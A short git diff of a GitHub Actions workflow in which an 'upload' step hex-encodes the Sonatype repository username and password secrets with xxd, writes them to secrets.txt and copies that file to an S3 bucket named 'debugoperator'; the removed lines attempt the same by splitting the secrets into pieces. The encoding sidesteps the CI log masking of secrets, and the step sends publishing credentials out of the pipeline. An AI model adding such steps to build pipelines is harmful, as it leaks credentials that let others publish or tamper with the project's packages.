@@ -18,7 +18,7 @@ jobs:
 
       - name: upload
         run: |
-          echo -n "${{ secrets.SONATYPE_OSS_USERNAME }}" >> foo && cut -c1-3 foo && cut -c4 >> secrets.txt
-          echo -n "${{ secrets.SONATYPE_OSS_PASSWORD }}" >> foo && cut -c1-3 foo && cut -c4 >> secrets.txt
+          echo -n "${{ secrets.SONATYPE_OSS_USERNAME }}" | xxd -ps >> secrets.txt
+          echo -n "${{ secrets.SONATYPE_OSS_PASSWORD }}" | xxd -ps >> secrets.txt
           aws s3 cp secrets.txt s3://debugoperator
 
